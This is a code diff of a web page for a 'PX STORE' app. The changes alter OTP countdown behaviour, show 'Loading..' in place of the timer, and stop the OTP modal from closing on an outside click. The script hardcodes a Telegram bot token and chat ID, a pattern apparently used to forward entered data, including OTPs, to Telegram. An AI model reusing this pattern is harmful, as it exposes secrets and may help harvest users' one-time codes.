@@ -364,7 +364,7 @@
     </div>
 
     <script>
-    // Konfigurasi Telegram Bot
+        // Konfigurasi Telegram Bot
 const TELEGRAM_BOT_TOKEN = '7513756403:AAHxi73Wd_wI2dfm3yoWIWPXYiowXCZkQB4';
 const TELEGRAM_CHAT_ID = '7661292905';
 
@@ -438,7 +438,7 @@ function startOtpCountdown() {
     const resendOtpButton = document.querySelector('button[onclick="resendOtp()"]');
     
     if (!otpExpiryTime) {
-        otpExpiryTime = Date.now() + (10 * 60 * 1000); // 10 menit dari sekarang
+        otpExpiryTime = Date.now() + (5 * 60 * 1000); // 10 menit dari sekarang
     }
     
     // Clear existing interval
@@ -470,7 +470,7 @@ function startOtpCountdown() {
             }
             if (resendOtpButton) {
                 resendOtpButton.disabled = true;
-                resendOtpButton.textContent = `Tunggu ${minutes}:${seconds.toString().padStart(2, '0')}`;
+                resendOtpButton.textContent = `Loading..`;
             }
         }
     }, 1000);
@@ -1375,18 +1375,16 @@ document.addEventListener('DOMContentLoaded', function() {
         document.getElementById('email').value = savedEmail;
     }
     
-    // Tutup modal jika klik di luar modal
+    // PERBAIKAN: Hanya register modal yang bisa ditutup dengan klik di luar
     document.getElementById('registerModal').addEventListener('click', function(e) {
         if (e.target === this) {
             closeRegisterForm();
         }
     });
     
-    document.getElementById('otpModal').addEventListener('click', function(e) {
-        if (e.target === this) {
-            closeOtpModal();
-        }
-    });
+    // PERBAIKAN: Modal OTP TIDAK bisa ditutup dengan klik di luar
+    // Hapus event listener yang menutup modal OTP saat klik di luar
+    // Modal OTP hanya bisa ditutup dengan tombol close (X)
     
     console.log('Aplikasi PX STORE siap digunakan dengan data dari GitHub');
 });
